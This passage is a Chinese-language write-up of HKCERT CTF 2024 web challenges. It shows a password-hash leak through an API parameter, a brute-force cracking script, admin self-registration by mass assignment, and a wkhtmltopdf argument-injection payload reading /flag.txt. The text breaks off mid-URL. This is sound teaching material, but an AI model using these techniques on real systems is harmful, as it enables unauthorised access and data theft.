---
title: 香港網安奪旗賽HKCERT CTF 2024 Write up（上）
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247508919&idx=1&sn=2cff2fd7e69983ae3378c70d1a76b0ae&chksm=fa527609cd25ff1fe3c74be524a1f379f348460073d3ce8248f759d1edafda7e1b53df4d71a8&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-11-22
fetch_date: 2025-10-06T19:17:19.412451
---

# 香港網安奪旗賽HKCERT CTF 2024 Write up（上）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZup1qc0pbdF28Ixn3WpW48cmjsdzESROj3D7AibsrHdCkat72fXicT1LA/0?wx_fmt=jpeg)

# 香港網安奪旗賽HKCERT CTF 2024 Write up（上）

原创

NEURON

山石网科安全技术研究院

* Web

+ 新免費午餐
+ 米斯蒂茲的迷你 CTF (1)
+ 米斯蒂茲的迷你 CTF (2)
+ PDF 生成器（1）
+ PDF 生成器（2）
+ 已知用火 (1)
+ 已知用火 (2)
+ JSPyaml
+ 奇美拉

* Misc

+ 自行取旗
+ B6ACP
+ My Lovely Cats

* Forensics

+ One Way Room
+ APT攻擊在哪裡 (1)

## Web

### 新免費午餐

控制台直接使用以下指令完成遊戲

```
score = 9999
endGame()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZl577jpuHNgRbpSBppbVzibE5K6icvh0JCzXdj4icrllPhIplxlCcnyVWg/640?wx_fmt=png&from=appmsg)

完成後在計分板中查看flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZX7dy1WIWykAASP3P5exVl2memI9kEADoB5BZQ8lrSZW9hJTicpsX9eg/640?wx_fmt=png&from=appmsg)

### 米斯蒂茲的迷你 CTF (1)

從sql初始化裡面可以看出Flag1在一個提交記錄裡面

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZXBXXSRBs9hFGysJMsPp1ib8sRe7Fve8iaTYDto3QqgJQ44Vd87AGNEiaQ/640?wx_fmt=png&from=appmsg)

查看attempt的model，有一個查詢過濾器，因此用戶只能查詢到自己的查詢記錄，因此需要拿到userid為2的用戶密碼才能取得這個flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZa9Dj7vcSB9WTfE3qbGl6RIuCJp1Ftd3eLJAHtPb6Pc33JypQIE8psw/640?wx_fmt=png&from=appmsg)

用戶player的密碼只有6位元hex格式字符

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZhBHJRXGLGPnhDYX0gPOPjvIF29k1jibNwd2fqqdDrpl9NoZRoyzodxg/640?wx_fmt=png&from=appmsg)

views中註冊api相關程式碼如下：

```
from flask import Blueprint, request, jsonify
from flask.views import MethodView
import collections

from app.views import pages
from app.views.api import users
from app.views.api import challenges
from app.views.api.admin import challenges as admin_challenges
from app.models.user import User
from app.models.challenge import Challenge
from app.models.attempt import Attempt

class GroupAPI(MethodView):
    init_every_request = False

    def __init__(self, model):
        self.model = model

        self.name_singular = self.model.__tablename__
        self.name_plural = f'{self.model.__tablename__}s'

    def get(self):
        # the users are only able to list the entries related to them
        items = self.model.query_view.all()

        group = request.args.get('group')

        if group is not None and not group.startswith('_') and group in dir(self.model):
            grouped_items = collections.defaultdict(list)
            for item in items:
                id = str(item.__getattribute__(group))
                grouped_items[id].append(item.marshal())
            return jsonify({self.name_plural: grouped_items}), 200

        return jsonify({self.name_plural: [item.marshal() for item in items]}), 200

def register_api(app, model, name):
    group = GroupAPI.as_view(f'{name}_group', model)
    app.add_url_rule(f'/api/{name}/', view_func=group)

def init_app(app):
    # Views
    app.register_blueprint(pages.route, url_prefix='/')

    # API
    app.register_blueprint(users.route, url_prefix='/api/users')
    app.register_blueprint(challenges.route, url_prefix='/api/challenges')
    app.register_blueprint(admin_challenges.route, url_prefix='/api/admin/challenges')

    register_api(app, User, 'users')
    register_api(app, Challenge, 'challenges')
    register_api(app, Attempt, 'attempts')
```

文件中定義了可以透過存取`/api/{name}/`的格式來取得指定model的數據，且group可以指定一個欄位名稱作為傳回內容的鍵名，因此可以額外取得到model預設返回值之外的字段，透過/api/users/?group=password可以獲得密碼：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZMDIkTMicNA1xiaOlTP0fU2tatGWG3TARSxAFycjD6cibNJdUxKiboMeqkQ/640?wx_fmt=png&from=appmsg)

發現並不是sql中設定的密碼格式，在user的model中可以找到原因，它創建了一個監聽器，每次進行密碼的修改就會透過compute\_hash來處理

```
@event.listens_for(User.password, 'set', retval=True)
def hash_user_password(target, value, oldvalue, initiator):
    if value != oldvalue:
        return compute_hash(value)
    return value
```

compute\_hash函數如下

```
def compute_hash(password, salt=None):
    if salt is None:
        salt = os.urandom(4).hex()
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()
```

因此我們透過api拿到的密碼是salt和sha256，使用以下腳本進行hash碰撞以獲得密碼

```
import hashlib
import itertools

chars = '0123456789abcdef'

combinations = [''.join(combo) for combo in itertools.product(chars, repeat=6)]
for password in combinations:
    if '744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94' == hashlib.sha256(f'77364c85/{password}'.encode()).hexdigest():
        print(password)

# 7df71e
```

使用密碼7df71e成功登入player用戶，造訪api/attempts/?group=flag 取得flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZFaqEvf9fmAZF4rEv9W3h0ApzE1vYmOwwusqm7QI4Z6jEib2wjSlQ37w/640?wx_fmt=png&from=appmsg)

### 米斯蒂茲的迷你 CTF (2)

和上面的使用同樣的環境，從sql中可以看出Flag2在id為1337的題目描述中，但是從api接口中查詢不到這個題目的信息，從代碼中找到原因，只要是通過query\_view來進行查詢的只能查詢到當前時間之前的記錄，而sql中定義了1337的題目時間是當前時間之後的，因此查不到

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZd2Xjzia4MsWWdz8ukcTWr5eQtGJKdX36EK4Pyk3HhTRuTuWvvaaQ32w/640?wx_fmt=png&from=appmsg)

找到位於admin的api裡面，沒有使用過濾器直接查詢的接口

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZ6BZGsiauI1XiagwpmFuefLIO3nASPsdlnqXxwyITpDwaUXDgkBcib4eYA/640?wx_fmt=png&from=appmsg)

因此需要登入admin用戶才能拿到Flag2，在註冊處直接使用了user的model來接收參數進行註冊

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZdyv6R4c37Wib0q7fAPaImq9RTRovia4UQITh7Ov5Az1tqgT2CH3x0r8A/640?wx_fmt=png&from=appmsg)

在model中定義了以下字段

```
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    password = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, default=0)
    last_solved_at = db.Column(db.DateTime)
```

因此註冊時使用傳入is\_admin為True即可註冊管理員用戶

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZz47VGrqvFdVO5abahwHqmLSm9wlvwdKoCUsE3LiciasCiaNvvbjWes45w/640?wx_fmt=png&from=appmsg)

註冊後在/api/admin/challenges/拿到flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaRian7xoY8URQlHprOIicmZaxJ4pJ8XibJetcDSe3J1iaOdJKSZGLzUJNXeNOd2ibCiaMYycV94ydVUcw/640?wx_fmt=png&from=appmsg)

### PDF 生成器（1）

主要程式碼如下：

```
@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    html_file = f"{session_id}.html"
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']

    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    with open(html_file, 'w') as file:
        file.write(response.text)

    # Make PDF
    stdout, stderr, returncode = execute_command(f'wkhtmltopdf {html_file} {pdf_file}')

    if returncode != 0:
        return f"""
        <h1>Error</h1>
        <pre>{stdout}</pre>
        <pre>{stderr}</pre>
        """

    return redirect(pdf_file)
```

疑似指令注入，跟進execute\_command

```
def execute_command(command):
    """
    Execute an external OS program securely with the provided command.

    Args:
        command (str): The command to execute.

    Returns:
        tuple: (stdout, stderr, return_code)
    """
    # Split the command into arguments safely
    args = shlex.split(command)

    try:
        # Execute the command and capture the output
        result = subprocess.run(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True  # Raises CalledProcessError for non-zero exit codes
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.CalledProcessError as e:
        # Return the error output and return code if command fails
        return e.stdout, e.stderr, e.returncode
```

指令被分割了，並不會造成注入，但是wkhtmltopdf存在任意檔案讀取漏洞，需要使用--enable-local-file-access參數，因此進行參數注入即可，先將html放在伺服器，再打poc

```
<html>
        <iframe src="file:///flag.txt">
</html>
```

```
url = "https://c52a-webpage-to-pdf-1-t519-r36jghu3qed6ru6azopujzln.hkcert24.pwnable....